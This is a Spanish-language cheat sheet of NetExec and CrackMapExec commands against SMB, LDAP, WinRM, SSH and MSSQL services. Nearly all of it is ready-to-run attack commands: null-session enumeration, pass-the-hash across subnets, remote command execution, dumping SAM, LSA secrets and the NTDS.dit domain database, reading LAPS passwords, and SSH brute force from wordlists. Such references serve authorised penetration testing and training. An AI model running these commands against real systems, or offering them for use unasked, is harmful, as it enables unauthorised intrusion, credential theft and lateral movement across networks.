# NetExec & CrackMapExec Cheat Sheet

Comandos rápidos para **NetExec** (`nxc`) y **CrackMapExec** (`cme`) para auditoría de servicios, enumeración de red, extracción de credenciales y movimiento lateral.

> [!NOTE]
> **NetExec (`nxc`)** es el sucesor y fork oficial activo de **CrackMapExec (`cme`)**. Todos los comandos de esta guía funcionan de forma idéntica sustituyendo `nxc` por `crackmapexec` o `cme` (ejemplo: `cme smb <IP> -u 'admin' -p 'pass'`).

---

## 1. Protocolo SMB (Puerto 445)

### Enumeración Inicial y Null Session
* Verificar acceso nulo (Null Session):
  ```bash
  nxc smb <IP_DC> -u '' -p ''
  ```
* Listar recursos compartidos (Shares):
  ```bash
  nxc smb <IP_DC> -u '' -p '' --shares
  ```
* Listar usuarios y políticas de contraseñas:
  ```bash
  nxc smb <IP_DC> -u '' -p '' --users --pass-pol
  ```

### Validación de Credenciales y Movimiento Lateral
* Validar credenciales de dominio en un segmento de red:
  ```bash
  nxc smb 192.168.1.0/24 -u 'usuario' -p 'contraseña'
  ```
* Autenticación basada en hash NTLM (Pass-the-Hash):
  ```bash
  nxc smb 192.168.1.0/24 -u 'usuario' -H 'NTLM_HASH'
  ```
* Autenticar como administrador local (`--local-auth`):
  ```bash
  nxc smb 192.168.1.0/24 -u 'Administrator' -p 'contraseña' --local-auth
  ```

### Post-Explotación y Extracción de Secretos
* Ejecución remota de comandos (requiere privilegios administrativos):
  ```bash
  nxc smb 192.168.1.0/24 -u 'admin' -H 'HASH' -x 'whoami /priv'
  ```
* Volcar bases de datos SAM y secretos LSA locales:
  ```bash
  nxc smb 192.168.1.0/24 -u 'admin' -H 'HASH' --sam
  nxc smb 192.168.1.0/24 -u 'admin' -H 'HASH' --lsa
  ```
* Volcar base de datos de Active Directory (NTDS.dit) desde el DC:
  ```bash
  nxc smb <IP_DC> -u 'DomainAdmin' -p 'password' --ntds
  ```

---

## 2. Protocolo LDAP (Puertos 389, 636)

* Buscar contraseñas en descripciones de usuarios del dominio:
  ```bash
  nxc ldap <IP_DC> -u 'usuario' -p 'password' --users
  ```
* Listar todos los equipos del dominio:
  ```bash
  nxc ldap <IP_DC> -u 'usuario' -p 'password' --computers
  ```
* Consultar contraseñas de LAPS:
  ```bash
  nxc ldap <IP_DC> -u 'usuario' -p 'password' -M laps
  ```

---

## 3. Protocolo WinRM (Puerto 5985)

* Validar credenciales y comprobar si la cuenta tiene privilegios administrativos (`Pwn3d!`):
  ```bash
  nxc winrm <IP> -u 'usuario' -p 'password'
  ```
* Ejecutar comandos remotamente:
  ```bash
  nxc winrm <IP> -u 'usuario' -p 'password' -x 'whoami'
  ```

---

## 4. Protocolo SSH (Puerto 22)

* Validar credenciales de usuario locales (o fuerza bruta):
  ```bash
  nxc ssh <IP> -u 'usuario' -p 'contraseña'
  
  # Utilizar listas externas de usuarios y contraseñas:
  nxc ssh <IP> -u usuarios.txt -p contraseñas.txt
  ```
* Ejecutar comandos de forma remota:
  ```bash
  nxc ssh <IP> -u 'usuario' -p 'password' -x 'id'
  ```

---

## 5. Protocolo MSSQL (Puerto 1433)

* Validar credenciales de acceso a la base de datos:
  ```bash
  nxc mssql <IP> -u 'sa' -p 'password'
  ```
* Habilitar y ejecutar comandos de consola (`xp_cmdshell`):
  ```bash
  nxc mssql <IP> -u 'sa' -p 'password' -x 'whoami'
  ```
